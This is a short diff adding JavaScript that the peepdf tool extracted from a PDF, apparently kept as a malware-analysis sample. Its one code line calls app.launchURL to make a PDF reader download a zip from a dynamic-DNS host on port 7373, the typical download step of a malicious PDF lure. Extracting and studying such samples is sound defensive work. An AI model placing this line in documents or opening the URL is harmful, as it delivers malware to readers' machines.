@@ -1,0 +1,4 @@
+// peepdf comment: Javascript code located in object 7 (version 0)
+
+app.launchURL('http://securedownload2.duckdns.org:7373/docs/Einreichung211117PDF.zip', true);
+
